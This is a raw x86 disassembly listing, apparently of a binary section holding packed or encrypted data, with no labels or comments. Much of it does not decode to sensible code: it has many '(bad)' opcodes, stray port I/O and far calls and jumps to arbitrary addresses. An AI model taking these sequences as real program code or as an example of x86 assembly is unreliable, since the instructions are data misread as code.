  41441e:	add    eax,0xfa481f22
  414423:	and    ch,al
  414425:	add    edi,DWORD PTR [esi]
  414427:	pop    ebx
  414428:	push   0xfffffffe
  41442a:	test   eax,0x98d17b5b
  41442f:	test   al,0xef
  414431:	or     BYTE PTR [edx],0x23
  414434:	add    BYTE PTR [eax+0xce75b51],al
  41443a:	jle    0x4143e3
  41443c:	es aam 0x78
  41443f:	test   al,0xef
  414441:	imul   ecx,DWORD PTR ds:0x703e76a,0x5e
  414448:	test   al,0x8b
  41444a:	mov    DWORD PTR [esi],esi
  41444c:	adc    al,BYTE PTR [ecx+edx*1+0x78283450]
  414453:	pop    ebx
  414454:	out    0xd2,eax
  414456:	popa   
  414457:	(bad)  
  414458:	test   BYTE PTR [ebx],0x3e
  41445b:	push   esi
  41445c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41445d:	clc    
  41445e:	push   edx
  41445f:	mov    esi,DWORD PTR [edi]
  414461:	ins    BYTE PTR es:[edi],dx
  414462:	stos   BYTE PTR es:[edi],al
  414463:	(bad)  
  414464:	xchg   esi,eax
  414465:	jg     0x41441d
  414467:	xchg   edi,eax
  414468:	xchg   ebx,eax
  414469:	fisttp QWORD PTR [esi+0x6c77fd22]
  41446f:	xor    ebx,DWORD PTR [esi-0x30]
  414472:	adc    BYTE PTR [edx],ah
  414474:	add    DWORD PTR [edx+0x0],eax
	...
  41449e:	add    BYTE PTR [eax],al
  4144a0:	inc    eax
  4144a1:	fwait
  4144a2:	xor    BYTE PTR [ecx+0x66cfa83d],0xf7
  4144a9:	sub    ecx,ebp
  4144ab:	test   eax,0x62fe2101
  4144b0:	imul   DWORD PTR ds:0x567c205a
  4144b6:	add    BYTE PTR [esp+eax*8+0x76258235],bl
  4144bd:	mov    BYTE PTR [ebp+0x6a],dl
  4144c0:	jg     0x414482
  4144c2:	dec    ecx
  4144c3:	test   al,0x3d
  4144c5:	pop    ebx
  4144c6:	jae    0x4144b7
  4144c8:	cwde   
  4144c9:	jg     0x414492
  4144cb:	sub    ecx,DWORD PTR [esi+0x5b]
  4144ce:	mov    ebp,DWORD PTR [ebp+ebp*1+0x3194fd92]
  4144d5:	xor    edi,DWORD PTR [eax+0xa211898]
  4144db:	sub    DWORD PTR [ecx-0x29],eax
  4144de:	sub    ebp,eax
  4144e0:	cmp    eax,0x16c7f5b
  4144e5:	and    bh,dh
  4144e7:	stc    
  4144e8:	cmp    eax,0x3af68152
  4144ed:	pop    ebx
  4144ee:	add    dh,dl
  4144f0:	and    ax,0x54fe
  4144f4:	loop   0x41452f
  4144f6:	inc    ebp
  4144f7:	sbb    al,0xd9
  4144f9:	and    BYTE PTR [edx],cl
  4144fb:	test   eax,0xe804d840
  414500:	cmp    eax,0x34fd5b
	...
  41452d:	add    BYTE PTR [esi+0x25a17420],bh
  414533:	mul    BYTE PTR [ebp+0x28]
  414536:	cmp    dh,BYTE PTR [ebx]
  414538:	rcl    BYTE PTR [edi+0x248821a8],cl
  41453e:	scas   al,BYTE PTR es:[edi]
  41453f:	and    DWORD PTR [eax+eax*1-0x3d],esi
  414543:	mov    eax,ds:0xfb2ff874
  414548:	inc    cx
  41454a:	pop    ss
  41454b:	mov    ch,0xbd
  41454d:	(bad)  
  41454e:	nop
  41454f:	mov    eax,ds:0xa18f4588
  414554:	je     0x414552
  414556:	nop
  414557:	and    esi,esi
  414559:	push   0x4139c8
  41455e:	jg     0x41454b
  414560:	sti    
  414561:	inc    DWORD PTR [eax+0x64e444cf]
  414567:	pop    ebx
  414568:	in     al,dx
  414569:	add    al,ah
  41456b:	fsubr  DWORD PTR [eax-0x7ea32900]
  414571:	jge    0x4145c2
  414573:	pop    esp
  414574:	or     eax,0x5c3084
  414579:	add    BYTE PTR [ebx+ebx*2],dl
  41457c:	in     al,0x0
  41457e:	sbb    al,0x94
  414581:	add    BYTE PTR [edi+0x2f75fd5c],ah
  414587:	mov    ah,0x61
  414589:	ss xchg edi,eax
  41458b:	pop    esp
  41458c:	mov    DWORD PTR [ebp+0x3f],esi
  41458f:	aad    0xfb
  414591:	mov    eax,DWORD PTR [eax]
	...
  4145bb:	add    BYTE PTR [edi-0x73ae1774],ch
  4145c1:	jno    0x414629
  4145c3:	lods   eax,DWORD PTR ds:[esi]
  4145c4:	push   ebx
  4145c5:	addr16 jb 0x4145d0
  4145c8:	xor    esp,DWORD PTR [ebp+esi*2+0x4]
  4145cc:	xor    esp,DWORD PTR [edi-0x17]
  4145cf:	add    al,0x43
  4145d1:	sbb    al,0x2
  4145d3:	or     dl,bh
  4145d5:	fisubr DWORD PTR ds:0xf9dc5d72
  4145db:	cmp    DWORD PTR [eax+0x58],ebx
  4145de:	sub    ah,0x17
  4145e1:	mov    bl,0x3
  4145e3:	cmp    BYTE PTR [esi],0xd6
  4145e6:	sar    DWORD PTR [edi-0x6],0x3b
  4145ea:	inc    edx
  4145eb:	fild   WORD PTR [edx+0x2c]
  4145ee:	inc    esi
  4145ef:	test   eax,0x744b2d87
  4145f4:	clc    
  4145f5:	dec    edx
  4145f6:	mov    DWORD PTR [edx+eiz*8-0x50],ecx
  4145fa:	cmc    
  4145fb:	out    0xc9,eax
  4145fd:	out    dx,al
  4145fe:	popa   
  4145ff:	(bad)  
  414600:	jnp    0x41459c
  414602:	add    al,0x0
  414604:	xor    cl,BYTE PTR ds:[edi-0x181df5bc]
  41460b:	add    BYTE PTR [edx+esi*1-0x18],ah
  41460f:	jmp    DWORD PTR [edi+0x32]
  414612:	call   0x5e300116
  414617:	dec    edi
  414618:	rol    DWORD PTR [esi],0x9f
  41461b:	dec    edx
  41461c:	push   DWORD PTR [ecx]
  41461e:	or     eax,eax
	...
  414648:	add    BYTE PTR [eax],al
  41464a:	sub    dl,BYTE PTR [ecx+eax*4]
  41464d:	jl     0x4145d5
  41464f:	xor    esi,esi
  414651:	sbb    esp,DWORD PTR [ecx+0x13fe55c6]
  414657:	jp     0x4146d4
  414659:	je     0x4145f5
  41465b:	and    bh,dh
  41465d:	jmp    0x4145e8
  41465f:	sahf   
  414660:	or     eax,ebp
  414662:	ret    
  414663:	sub    eax,0x7e79fe7d
  414668:	pop    esp
  414669:	out    0x67,eax
  41466b:	inc    esi
  41466c:	add    al,0x0
  41466e:	imul   edi,DWORD PTR [esi+0x70],0x7b7b67e7
  414675:	(bad)  
  414676:	pop    ecx
  414677:	pop    esi
  414678:	ins    BYTE PTR es:[edi],dx
  414679:	out    0x4f,eax
  41467b:	imul   edi,DWORD PTR [ebx-0x2],0x49
  41467f:	pop    esi
  414680:	push   0x7b7b57e7
  414685:	dec    bl
  414687:	pop    ebx
  414688:	sub    al,0x74
  41468a:	xor    DWORD PTR [ebx],0x1f28d300
  414690:	aaa    
  414691:	fdivrp st(6),st
  414693:	sbb    esp,ebx
  414695:	add    esi,DWORD PTR [ebx-0x2e]
  414698:	xchg   ebx,eax
  414699:	cmp    ch,0x1f
  41469c:	adc    al,BYTE PTR [esp+edx*4]
  41469f:	cwde   
  4146a0:	jbe    0x414698
  4146a2:	cmp    DWORD PTR [ebx],esi
  4146a4:	call   0x71603f74
  4146a9:	(bad)  
  4146aa:	cmc    
  4146ab:	push   ds
  4146ac:	aad    0xb
	...
  4146d6:	add    BYTE PTR [eax],al
  4146d8:	(bad)  
  4146d9:	jns    0x41472f
  4146db:	jl     0x4146bd
  4146dd:	mov    cl,0xe4
  4146df:	imul   ecx,DWORD PTR [ebx-0x72],0x46
  4146e3:	jl     0x414729
  4146e5:	sbb    esi,DWORD PTR [ebp+ebx*1+0x4fbfb36e]
  4146ec:	add    DWORD PTR [ebx-0x41],ebx
  4146ef:	add    edi,DWORD PTR [esi]
  4146f1:	cs data16 jmp 0x4146b7
  4146f5:	mov    dh,0xa8
  4146f7:	add    ecx,DWORD PTR [esi]
  4146f9:	push   ds
  4146fa:	popf   
  4146fb:	or     edx,DWORD PTR [esi-0x678366c5]
  414701:	xor    ebx,DWORD PTR [ecx+ecx*8-0x70]
  414705:	push   ds
  414706:	push   ebp
  414708:	test   DWORD PTR [esi],ebx
  41470a:	jge    0x414717
  41470c:	xchg   esi,eax
  41470d:	push   esi
  41470e:	lahf   
  41470f:	jl     0x414789
  414711:	adc    al,0xaa
  414713:	add    BYTE PTR [esi],bh
  414715:	mov    BYTE PTR [edx+0x68],dh
  414718:	mov    esp,0xd7d3d417
  41471d:	pop    edx
  41471e:	inc    ecx
  41471f:	ret    0xa858
  414722:	out    dx,eax
  414723:	imul   esp,DWORD PTR [edi-0x4984416a],0xffffff98
  41472a:	add    BYTE PTR [ebp+0x21455fb1],dh
  414730:	add    ebx,DWORD PTR [esi]
  414732:	jle    0x41471a
  414734:	cmp    eax,0x88114fa7
  414739:	mov    ch,0x3f
  41473b:	jmp    0x414740
	...
  414764:	add    BYTE PTR [eax],al
  414766:	or     al,0x36
  414768:	int3   
  414769:	xlat   BYTE PTR ds:[ebx]
  41476a:	cmp    eax,0xea9095b
  41476f:	pop    esp
  414770:	jmp    0x664d5d63
  414775:	sub    BYTE PTR [edx],bh
  414777:	xchg   al,ch
  414779:	sub    eax,0xf2005b2c
  41477e:	jge    0x41472a
  414780:	and    DWORD PTR [esi+0x56544e55],esi
  414786:	gs push ecx
  414788:	rcl    ch,0x3a
  41478b:	mov    ebp,DWORD PTR [eax-0x17]
  41478e:	cmp    eax,0x62d1bf2e
  414793:	mov    ch,0x3f
  414795:	jmp    0xe1b56487
  41479a:	and    eax,0x35267146
  41479f:	and    BYTE PTR ss:[ebx-0x2502e2dc],dh
  4147a6:	std    
  4147a7:	loop   0x4147a6
  4147a9:	push   cs
  4147aa:	adc    eax,0x5257f31d
  4147af:	push   esi
  4147b0:	jae    0x414800
  4147b2:	add    eax,0x8ef6fca7
  4147b7:	push   ebp
  4147b8:	call   0xfe5dc524
  4147bd:	inc    esi
  4147be:	add    ebx,DWORD PTR [eax*1-0x132f7117]
  4147c5:	push   0xcef60e21
	...
  4147f2:	add    BYTE PTR [eax],al
  4147f4:	aam    0xce
  4147f6:	inc    ebx
  4147f7:	add    BYTE PTR [ebx+0x9],bh
  4147fa:	push   DWORD PTR [ebp+0x67]
  4147fd:	mov    al,ds:0x427f0c74
  414802:	add    BYTE PTR ss:[edi],ah
  414805:	dec    esi
  414806:	ror    BYTE PTR [edi],0xa2
  414809:	imul   eax,DWORD PTR [edx],0x0
  41480c:	pop    ss
  41480d:	call   0x0:0x5917f844
  414814:	loopne 0x414831
  414816:	out    dx,al
  414817:	jmp    DWORD PTR [eax]
  414819:	pop    ecx
  41481a:	add    BYTE PTR [edx+0x17],ch
  41481d:	das    
  41481e:	(bad)  
  41481f:	imul   edx,DWORD PTR [edi],0x228cfe2f
  414825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414826:	dec    ebp
  414827:	lea    esp,[edx-0x58]
  41482a:	idiv   bh
  41482c:	mov    BYTE PTR [eax],cl
  41482e:	push   DWORD PTR [ebp-0x71]
  414831:	mov    eax,ds:0xb17ffc74
  414836:	xor    al,0x0
  414838:	out    0x4d,eax
  41483a:	shl    BYTE PTR [edx+eiz*8-0x51],0xf5
  41483f:	add    edi,edx
  414841:	pop    eax
  414842:	push   0xfe17df9f
  414847:	(bad)  
  414848:	ror    BYTE PTR [eax-0x18],cl
  41484b:	inc    eax
  41484c:	fisub  DWORD PTR [ecx-0x77e3af02]
  414852:	mov    WORD PTR [ebp-0x156c9],es
	...
  414880:	add    BYTE PTR [eax],al
  414882:	mov    bh,0x6
  414884:	out    0x30,al
  414886:	fisub  DWORD PTR [ecx-0x4bed7602]
  41488c:	idiv   bh
  41488e:	push   0x584983b1
  414893:	mov    ds:0x793458c,al
  414898:	data16 aas 
  41489a:	ds call 0xf668:0xc758ffc1
  4148a2:	push   ecx
  4148a3:	adc    eax,0xa3a7478
  4148a8:	or     BYTE PTR [ebx+0x41],0xe5
  4148ac:	mov    DWORD PTR [esi+edx*1-0x5b01881b],eax
  4148b3:	xor    ch,dl
  4148b5:	inc    edi
  4148b6:	xchg   esi,eax
  4148b7:	jae    0x4148bd
  4148b9:	(bad)  
  4148ba:	jmp    0x414891
  4148bc:	outs   dx,DWORD PTR ds:[esi]
  4148bd:	(bad)  
  4148be:	sbb    ebp,ecx
  4148c0:	in     eax,dx
  4148c1:	or     esp,DWORD PTR [esi]
  4148c3:	inc    esi
  4148c4:	enter  0x9fe,0xab
  4148c8:	jge    0x4148b1
  4148ca:	or     DWORD PTR [ebp+0x5a3e6977],esp
  4148d0:	shl    DWORD PTR [edi+0x7f],cl
  4148d3:	xor    bh,BYTE PTR [ecx-0x4c]
  4148d6:	fiadd  DWORD PTR [edi+esi*2+0x5fee1fe]
  4148dd:	call   0xfeba0751
  4148e2:	(bad)  
  4148e3:	scas   al,BYTE PTR es:[edi]
  4148e4:	pusha  
  4148e5:	test   BYTE PTR [eax],0x0
	...
  414910:	leave  
  414911:	pop    esp
  414912:	test   DWORD PTR [edx+ebp*8+0xefe775c],eax
  414919:	sbb    ch,ch
  41491b:	push   DWORD PTR [bx+di]
  41491e:	jns    0x4148d4
  414920:	call   0x5be:0xa1fe7744
  414927:	call   0xfeba077b
  41492c:	inc    ebp
  41492d:	jb     0x41491f
  41492f:	sbb    BYTE PTR [ebp-0x7e09afa2],bh
  414935:	and    al,0xfe
  414937:	je     0x414987
  414939:	sub    eax,0x5abb8f32
  41493e:	(bad)  
  41493f:	jo     0x4149a9
  414941:	sbb    edi,DWORD PTR [eax]
  414943:	ins    BYTE PTR es:[edi],dx
  414944:	arpl   WORD PTR [edx+0x466478d6],dx
  41494a:	loop   0x41498f
  41494c:	int    0x54
  41494e:	pop    ss
  41494f:	ins    BYTE PTR es:[edi],dx
  414950:	dec    edi
  414951:	xchg   edx,eax
  414952:	mov    esi,0xc7d57878
  414957:	jo     0x414991
  414959:	sbb    edx,ebp
  41495b:	add    edi,DWORD PTR [esi]
  41495d:	pop    ebx
  41495e:	adc    DWORD PTR [esi+edx*4],eax
  414961:	mov    ch,0xf
  414963:	ret    
  414964:	and    DWORD PTR [edx],ebx
  414966:	pop    ebp
  414967:	adc    BYTE PTR [bp+di],bl
  41496a:	(bad)  
  41496b:	js     0x4148f7
  41496d:	addr16 (bad) 
  41496f:	ins    BYTE PTR es:[edi],dx
  414970:	je     0x41498c
  414972:	jg     0x4148fe
	...
  41499c:	add    BYTE PTR [eax],al
  41499e:	mov    edx,0xf8787f37
  4149a3:	test   edi,esp
  4149a5:	jmp    0x414a12
  4149a7:	sub    DWORD PTR [eax+0x4bd0e903],0x70
  4149ae:	loopne 0x4149ca
  4149b0:	push   edi
  4149b1:	out    dx,al
  4149b2:	inc    ebp
  4149b3:	add    edi,DWORD PTR [eax]
  4149b5:	int3   
  4149b6:	rcr    BYTE PTR [edx],1
  4149b8:	jno    0x414a38
  4149ba:	stc    
  4149bb:	adc    bh,BYTE PTR [edi]
  4149bd:	js     0x41497b
  4149bf:	fmul   DWORD PTR [edi]
  4149c1:	jo     0x41497b
  4149c3:	sbb    ch,al
  4149c5:	or     BYTE PTR [edx+0x3e03e7ef],bh
  4149cb:	sub    DWORD PTR [eax-0x15],0xfffffffe
  4149cf:	pop    edx
  4149d0:	fs mov esi,0xae0eab8d
  4149d6:	imul   edx,DWORD PTR [edx],0x69a17807
  4149dc:	jns    0x414a56
  4149de:	and    BYTE PTR [esi+0x0],0x29
  4149e2:	imul   edx,DWORD PTR [esi+0x19e16c81],0xd7bd5f72
  4149ec:	in     al,0xd6
  4149ee:	jmp    0x679e4b0b
  4149f3:	fnstsw WORD PTR [ebx-0x1e71e3f]
  4149f9:	jmp    0xd9a9c857
  4149fe:	cmp    eax,0xb6bf0a
	...
  414a2b:	add    BYTE PTR [edi],ch
  414a2d:	(bad)  
  414a2e:	call   0xfe5a4903
  414a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a34:	out    dx,eax
  414a35:	add    esi,esi
  414a37:	sahf   
  414a38:	test   eax,0xa5e17419
  414a3d:	xchg   DWORD PTR [ebx-0x72],eax
  414a40:	mov    DWORD PTR [ecx],ebx
  414a42:	mov    ah,0x8d
  414a44:	cdq    
  414a45:	sbb    esi,edi
  414a47:	jle    0x414a58
  414a49:	(bad)  
  414a4a:	call   0xfe5a4965
  414a4f:	outs   dx,BYTE PTR ds:[esi]
  414a50:	out    dx,eax
  414a51:	or     eax,0x118a9cfe
  414a56:	(bad)  
  414a57:	pop    esi
  414a58:	imul   ecx,DWORD PTR [edi-0x5fe3bef8],0xcf494efd
  414a62:	loopne 0x414aa2
  414a64:	push   ecx
  414a65:	sbb    esi,edi
  414a67:	mov    ah,0x35
  414a69:	add    ebx,edi
  414a6b:	lods   eax,DWORD PTR ds:[esi]
  414a6c:	xor    BYTE PTR [ecx],bl
  414a6e:	(bad)  
  414a6f:	je     0x414a87
  414a71:	adc    esi,edi
  414a73:	xor    DWORD PTR es:[edi-0x5f93eef8],ecx
  414a7a:	std    
  414a7b:	push   ss
  414a7c:	adc    edi,ecx
  414a7e:	rcl    BYTE PTR [esi],1
  414a80:	or     DWORD PTR [ecx],ebx
  414a82:	inc    BYTE PTR [eax]
  414a84:	or     ah,BYTE PTR [esi-0x18]
  414a87:	and    al,0xda
  414a89:	nop
  414a8a:	(bad)  
  414a8b:	(bad)  
  414a8c:	cmp    dh,BYTE PTR [edi+0xfff6]
	...
  414aba:	pusha  
  414abb:	test   DWORD PTR [ebx],eax
  414abd:	dec    eax
  414abe:	pusha  
  414abf:	nop
  414ac0:	(bad)  
  414ac1:	mov    ch,0x8f
  414ac3:	mov    dh,bh
  414ac5:	(bad)  
  414ac6:	jg     0x414a5c
  414ac8:	inc    esi
  414ac9:	inc    DWORD PTR [eax-0x77234b70]
  414acf:	nop
  414ad0:	(bad)  
  414ad1:	call   0x40235d
  414ad6:	lock retf 
  414ad8:	loope  0x414ad1
  414ada:	loopne 0x414a6d
  414adc:	in     eax,0xe5
  414ade:	pop    eax
  414adf:	nop
  414ae0:	(bad)  
  414ae1:	dec    DWORD PTR [edx-0x4f000954]
  414ae7:	test   bh,dl
  414ae9:	inc    edi
  414aea:	rcl    BYTE PTR [ecx-0x764c4a02],0xfe
  414af1:	inc    DWORD PTR [eax-0x500f5f5]
  414af7:	fs call 0xfed2adc3
  414afd:	dec    edx
  414aff:	xor    dh,0xff
  414b02:	add    BYTE PTR [ebx+edi*4-0x16e8fb9],0x45
  414b0a:	outs   dx,DWORD PTR ds:[esi]
  414b0b:	xchg   edi,edx
  414b0d:	std    
  414b0e:	adc    BYTE PTR [ecx-0x7bfc8a02],0xd7
  414b15:	xor    esp,DWORD PTR [edi-0x6c3d38a4]
  414b1b:	pop    esp
  414b1c:	push   ebx
  414b1d:	mov    eax,DWORD PTR [eax]
	...
  414b47:	add    BYTE PTR [ebx-0x23],dl
  414b4a:	shl    esp,0x12
  414b4d:	sbb    edi,edx
  414b4f:	push   eax
  414b50:	fisub  DWORD PTR ds:[edi]
  414b53:	push   0xeaea01ff
  414b58:	and    ebx,eax
  414b5a:	add    edi,edi
  414b5c:	or     eax,DWORD PTR [esi]
  414b5e:	push   0xffffffa5
  414b60:	add    al,0x11
  414b62:	je     0x414b6e
  414b64:	jle    0x414af4
  414b66:	jmp    0xeb03:0x787fbd4f
  414b6d:	pop    eax
  414b6e:	jae    0x414b9f
  414b70:	leave  
  414b71:	inc    edi
  414b72:	jl     0x414af4
  414b74:	shr    DWORD PTR [ecx],cl
  414b76:	jno    0x414b78
  414b78:	ds add ch,ah
  414b7b:	push   es
  414b7c:	jns    0x414bbd
  414b7e:	jl     0x414b73
  414b80:	aas    
  414b81:	add    al,BYTE PTR [edx]
  414b83:	jmp    0x414c01
  414b85:	leave  
  414b86:	in     eax,dx
  414b87:	not    DWORD PTR [esi+0x3e40ea36]
  414b8d:	xchg   DWORD PTR [ebp-0x1225911d],edi
  414b93:	xor    bh,BYTE PTR [esi]
  414b95:	add    al,BYTE PTR [ecx+0x46c3ac3]
  414b9b:	lea    edi,[ebx-0x22]
  414b9e:	aam    0x67
  414ba0:	in     eax,0x68
  414ba2:	sar    edi,0xf0
  414ba5:	push   cs
  414ba6:	push   es
  414ba7:	call   0xfeb61837
	...
  414bd4:	add    BYTE PTR [eax],al
  414bd6:	xor    eax,0x6e13f042
  414bdb:	sbb    al,BYTE PTR [ebx]
  414bdd:	add    cl,ah
  414bdf:	out    0xd4,eax
  414be1:	(bad)  
  414be2:	push   ebx
  414be3:	or     ch,BYTE PTR [edx+0x3e]
  414be6:	push   ebx
  414be7:	pop    ecx
  414be8:	jae    0x414bd1
  414bea:	imul   ecx,ecx,0x74
  414bed:	(bad)  
  414bee:	mov    cl,0xf6
  414bf0:	jns    0x414b74
  414bf2:	sub    ebx,DWORD PTR [ebx+0x1f]
  414bf5:	add    al,0x2b
  414bf7:	ror    DWORD PTR [edi],cl
  414bf9:	adc    eax,0x4b171801
  414bfe:	jg     0x414c62
  414c00:	out    0xce,eax
  414c02:	mov    ah,0x6
  414c04:	imul   eax,DWORD PTR [eax-0x7b],0xffffff84
  414c08:	out    0xe9,eax
  414c0a:	add    BYTE PTR [eax],bl
  414c0c:	jge    0x414c19
  414c0e:	cwd    
  414c10:	mov    ds:0x2ce16874,eax
  414c15:	js     0x414bf0
  414c17:	popa   
  414c18:	dec    edi
  414c19:	ret    
  414c1a:	pop    ecx
  414c1b:	sbb    BYTE PTR ds:0xe799f941,bl
  414c21:	je     0x414bf5
  414c23:	(bad)  
  414c24:	iret   
  414c25:	jae    0x414c6c
  414c27:	pop    ss
  414c28:	mov    edi,0x288346eb
  414c2d:	add    al,0xa6
  414c2f:	pop    ecx
  414c30:	out    0x3,eax
  414c32:	mov    esi,0x160c1d16
  414c37:	ss pushf 
  414c39:	je     0x414c3b
	...
  414c63:	add    BYTE PTR [eax],bl
  414c65:	pop    ss
  414c66:	fld    QWORD PTR [eax+0x79]
  414c69:	pushf  
  414c6a:	out    0x74,eax
  414c6c:	xchg   edx,eax
  414c6d:	arpl   WORD PTR [edi+0x7f17012a],cx
  414c73:	jmp    0x414cb4
  414c75:	pop    ebx
  414c76:	out    0x83,eax
  414c78:	lock nop
  414c7a:	fild   QWORD PTR [ebx+0x45]
  414c7d:	push   ss
  414c7e:	addr16 je 0x414c61
  414c81:	nop
  414c82:	pop    ebx
  414c83:	je     0x414cd7
  414c85:	arpl   WORD PTR [edi],di
  414c87:	cmp    bh,BYTE PTR [edx+0x16]
  414c8a:	dec    edi
  414c8b:	dec    edx
  414c8c:	call   FWORD PTR [edi-0x19]
  414c8f:	into   
  414c90:	mov    ah,0x7
  414c92:	imul   edi,DWORD PTR [edi],0xffffff95
  414c95:	lods   eax,DWORD PTR ds:[esi]
  414c96:	add    BYTE PTR [esi-0x5e97e959],bl
  414c9c:	xor    cl,BYTE PTR [edi-0x66f9eef8]
  414ca2:	std    
  414ca3:	push   ds
  414ca4:	les    ebx,FWORD PTR [edi-0x43b79504]
  414caa:	dec    ecx
  414cab:	test   al,0x3d
  414cad:	pop    ebx
  414cae:	or     eax,0x5af86d
  414cb3:	jmp    0xa2e4a476
  414cb8:	jl     0x414cd0
  414cba:	(bad)  
  414cbb:	fsubp  st(1),st
  414cbd:	aad    0xff
  414cbf:	call   0x8c7d2701
  414cc4:	cdq    
  414cc5:	fwait
  414cc6:	add    cl,ch
	...
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	cmp    al,0xdf
  414cf4:	mov    cl,0xe8
  414cf6:	cmp    eax,0x5f04815b
  414cfb:	mov    eax,ds:0x663de93f
  414d00:	test   BYTE PTR [edi+0x6a005b3b],cl
  414d06:	outs   dx,DWORD PTR ds:[esi]
  414d07:	mov    WORD PTR [ecx+0x28],cs
  414d0a:	cmp    bl,BYTE PTR [ebx+0xd]
  414d0d:	gs retf 
  414d0f:	pop    edx
  414d10:	add    cl,ch
  414d12:	mov    eax,0x3227356
  414d17:	push   ss
  414d18:	(bad)  
  414d19:	idiv   BYTE PTR [ecx+0x3de8ffe1]
  414d1f:	fidivr DWORD PTR [ebx]
  414d21:	lock mov al,0x9a
  414d24:	add    cl,ch
  414d26:	cmp    al,0xdf
  414d28:	jge    0x414d12
  414d2a:	cmp    eax,0xbb1c815b
  414d2f:	mov    al,ds:0x663de93f
  414d34:	test   bl,bl
  414d36:	inc    edx
  414d37:	pop    ebx
  414d38:	add    BYTE PTR [eax],al
  414d3a:	out    dx,eax
  414d3b:	out    0x65,al
  414d3d:	inc    ecx
  414d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d3f:	aaa    
  414d40:	(bad)  
  414d41:	(bad)  
  414d42:	xchg   edx,eax
  414d43:	mov    esi,0x9697414a
  414d48:	inc    esp
  414d49:	clc    
  414d4a:	adc    al,0xc
  414d4c:	test   BYTE PTR [eax],0xa8
  414d4f:	fst    QWORD PTR [ebp+0x1]
  414d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d53:	pop    ecx
  414d54:	sub    esi,esi
	...
  414d7e:	add    BYTE PTR [eax],al
  414d80:	ror    DWORD PTR [eax+0x7438f874],1
  414d86:	mov    ds:0x8959a64b,eax
  414d8b:	lock pop esp
  414d8d:	xchg   ebx,eax
  414d8e:	je     0x414d95
  414d90:	ds push ecx
  414d92:	(bad)  
  414d93:	call   DWORD PTR [edi-0x6c]
  414d96:	push   ebx
  414d97:	or     al,0xcc
  414d99:	xlat   BYTE PTR ds:[ebx]
  414d9a:	gs mov ebp,ebp
  414d9d:	cli    
  414d9e:	mov    BYTE PTR [ebp+0x73],cl
  414da1:	adc    al,0xff
  414da3:	psrlq  mm5,QWORD PTR [edx-0x1]
  414da7:	jmp    DWORD PTR [edi]
  414da9:	mov    eax,0x5927010b
  414dae:	push   0xfe1e7f9c
  414db3:	inc    BYTE PTR [eax]
  414db5:	mov    cl,0x33
  414db7:	xor    DWORD PTR [edi],esp
  414db9:	pop    ecx
  414dba:	or     eax,eax
  414dbc:	sbb    ah,ah
  414dbe:	icebp  
  414dbf:	add    BYTE PTR [edi],dl
  414dc1:	pop    ecx
  414dc2:	cmp    DWORD PTR [edi+0xf],0xcd840d59
  414dc9:	pop    eax
  414dca:	add    BYTE PTR [eax],al
  414dcc:	push   0xb8e80611
  414dd1:	and    edi,edi
  414dd3:	jmp    FWORD PTR [esi+0x23]
  414dd6:	out    dx,al
  414dd7:	push   eax
  414dd9:	adc    bh,bh
  414ddb:	jne    0x414e1b
  414ddd:	mov    dl,0x72
  414ddf:	jbe    0x414e1b
  414de1:	call   0x0:0x4608
	...
  414e0c:	add    BYTE PTR [eax],al
  414e0e:	rcr    DWORD PTR [ebp-0x3cd95a27],0x1
  414e15:	jmp    FWORD PTR [ebx]
  414e17:	push   edx
  414e18:	pop    ecx
  414e19:	std    
  414e1a:	outs   dx,BYTE PTR ds:[esi]
  414e1b:	add    al,BYTE PTR [edx]
  414e1d:	or     edi,DWORD PTR [esi+0xd]
  414e20:	mov    DWORD PTR [ebx+0x6a02023e],esi
  414e26:	ds jg  0x414df1
  414e29:	out    0xee,eax
  414e2b:	mov    dh,0xc8
  414e2d:	jmp    0x414e1d
  414e2f:	out    0x1,eax
  414e31:	push   0x3e
  414e33:	in     al,dx
  414e34:	jb     0x414e4a
  414e36:	mov    ds:0x34ffc4b9,eax
  414e3b:	inc    edx
  414e3c:	add    al,BYTE PTR [ecx+ecx*8-0x34fffdfe]
  414e43:	aas    
  414e44:	push   0x5cb7514f
  414e49:	(bad)  
  414e4a:	rcl    ebp,cl
  414e4c:	outs   dx,DWORD PTR ds:[esi]
  414e4d:	adc    al,0xd3
  414e4f:	dec    eax
  414e50:	sar    edi,0x44
  414e53:	ret    0x77f8
  414e56:	ret    
  414e57:	inc    esi
  414e58:	fs dec edi
  414e5a:	xchg   esp,eax
  414e5b:	add    bl,ah
  414e5d:	call   DWORD PTR [edi+0x18ffdc05]
  414e63:	outs   dx,DWORD PTR ds:[esi]
  414e64:	push   0xbb732bfe
  414e69:	inc    eax
  414e6a:	ds stc 
  414e6c:	inc    ecx
  414e6d:	jae    0x414ed7
  414e6f:	(bad)  
  414e71:	fild   WORD PTR [eax]
	...
  414e9b:	add    dh,ah
  414e9d:	pop    esp
  414e9e:	(bad)  
  414ea1:	jp     0x414e68
  414ea3:	fstp   TBYTE PTR [ebx-0x1eb09bc2]
  414ea9:	pop    edx
  414eaa:	fmul   QWORD PTR [edi+0x67]
  414ead:	pop    ebx
  414eae:	ror    DWORD PTR [eax],1
  414eb0:	fs pop ebx
  414eb2:	push   esi
  414eb3:	neg    ebp
  414eb5:	adc    esi,ebp
  414eb7:	bnd je 0x414e54
  414eba:	out    0xfc,eax
  414ebc:	stc    
  414ebd:	mov    ss,WORD PTR [eax]
  414ebf:	fdiv   QWORD PTR [ecx-0x574db8ed]
  414ec5:	(bad)  
  414ec6:	fistp  WORD PTR [ebx-0x78]
  414ec9:	cdq    
  414eca:	es jno 0x414e65
  414ecd:	mov    edi,gs
  414ecf:	jo     0x414edc
  414ed1:	pop    edi
  414ed2:	push   ss
  414ed3:	test   DWORD PTR [ecx+0x3],0x1380c30f
  414eda:	pop    es
  414edb:	neg    DWORD PTR [ecx+0x704f7513]
  414ee1:	(bad)  
  414ee2:	fistp  WORD PTR [ebx+0x6e]
  414ee5:	cdq    
  414ee6:	out    dx,al
  414ee7:	jo     0x414f49
  414ee9:	(bad)  
  414eea:	ret    
  414eeb:	pop    ebx
  414eec:	aas    
  414eed:	sahf   
  414eee:	fidiv  WORD PTR [eax+0x50]
  414ef1:	(bad)  
  414ef2:	retf   
  414ef3:	jo     0x414f27
  414ef5:	mov    fs,WORD PTR [edx]
  414ef7:	ret    
  414ef8:	inc    ecx
  414ef9:	and    edi,0xbeffb270
